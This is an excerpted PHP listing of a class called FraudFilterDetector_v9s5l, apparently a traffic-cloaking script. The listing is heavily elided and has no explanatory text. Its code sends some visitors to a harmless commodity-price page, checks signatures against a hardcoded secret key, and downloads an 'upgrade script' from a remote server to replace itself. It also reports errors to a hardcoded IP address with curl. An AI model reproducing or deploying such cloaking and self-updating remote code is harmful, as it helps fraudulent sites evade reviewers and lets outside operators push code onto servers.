...
class FraudFilterDetector_v9s5l {
    ...
    function isSignatureValid($sign, $time) {
        $str = '5fab6372-87be-4770-a788-cb428a5c8dfb.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function safeAction() {
        $this->redirect('https://tradingeconomics.com/commodity/corn');
    }
    ...
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: 5fab6372-87be-4770-a788-cb428a5c8dfb',
                'timeout' => 2
            )
        );
    ...
    function upgradeScript($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2Valid($output)) {
            ...
            $headers[] = 'x-ff-secret: 5fab6372-87be-4770-a788-cb428a5c8dfb';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: 5fab6372-87be-4770-a788-cb428a5c8dfb';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=v9s5l&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterDetector_v9s5l = new FraudFilterDetector_v9s5l();
$fraudFilterDetector_v9s5l->check();
